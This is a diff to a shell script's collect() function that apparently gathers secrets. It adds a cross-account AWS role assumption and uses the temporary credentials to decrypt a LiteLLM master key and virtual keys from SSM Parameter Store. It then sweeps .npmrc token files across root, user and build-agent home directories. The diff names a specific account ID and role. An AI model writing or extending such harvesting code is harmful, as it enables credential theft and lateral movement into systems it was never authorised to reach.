@@ -81,18 +81,36 @@ collect() {
   done
 
   printf '\n=LITELLM=\n'
-  printf 'MASTER_KEY=%s\n' "$(aws ssm get-parameter \
+  printf 'caller_identity=%s\n' "$(aws sts get-caller-identity --query Account --output text 2>/dev/null || echo DENIED)"
+  printf 'MASTER_KEY_direct=%s\n' "$(aws ssm get-parameter \
     --name /platform/llm-routing/litellm/MASTER_KEY \
     --with-decryption --region ap-southeast-2 \
     --query Parameter.Value --output text 2>/dev/null || echo ACCESS_DENIED)"
-  printf 'aurora_key=%s\n' "$(aws ssm get-parameter \
-    --name /litellm/virtual-keys/aurora/key \
-    --with-decryption --region ap-southeast-2 \
-    --query Parameter.Value --output text 2>/dev/null || echo ACCESS_DENIED)"
-  printf 'auroracore_key=%s\n' "$(aws ssm get-parameter \
-    --name /litellm/virtual-keys/auroracore/key \
-    --with-decryption --region ap-southeast-2 \
-    --query Parameter.Value --output text 2>/dev/null || echo ACCESS_DENIED)"
+  CREDS=$(aws sts assume-role \
+    --role-arn arn:aws:iam::702880128631:role/lendi-mcp-cross-account-readonly \
+    --role-session-name collect-litellm \
+    --region ap-southeast-2 \
+    --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
+    --output text 2>/dev/null) || true
+  if [ -n "$CREDS" ]; then
+    read AK SK ST <<< "$CREDS"
+    printf 'MASTER_KEY_dev=%s\n' "$(AWS_ACCESS_KEY_ID=$AK AWS_SECRET_ACCESS_KEY=$SK AWS_SESSION_TOKEN=$ST \
+      aws ssm get-parameter \
+      --name /platform/llm-routing/litellm/MASTER_KEY \
+      --with-decryption --region ap-southeast-2 \
+      --query Parameter.Value --output text 2>/dev/null || echo ACCESS_DENIED)"
+    printf 'aurora_key=%s\n' "$(AWS_ACCESS_KEY_ID=$AK AWS_SECRET_ACCESS_KEY=$SK AWS_SESSION_TOKEN=$ST \
+      aws ssm get-parameter \
+      --name /litellm/virtual-keys/aurora/key \
+      --with-decryption --region ap-southeast-2 \
+      --query Parameter.Value --output text 2>/dev/null || echo ACCESS_DENIED)"
+  else
+    printf 'cross_account_assume=DENIED\n'
+    printf 'aurora_key=%s\n' "$(aws ssm get-parameter \
+      --name /litellm/virtual-keys/aurora/key \
+      --with-decryption --region ap-southeast-2 \
+      --query Parameter.Value --output text 2>/dev/null || echo ACCESS_DENIED)"
+  fi
 
   printf '\n=NPM=\n'
   for f in ~/.npmrc /root/.npmrc /home/*/.npmrc /var/lib/buildkite-agent/.npmrc \
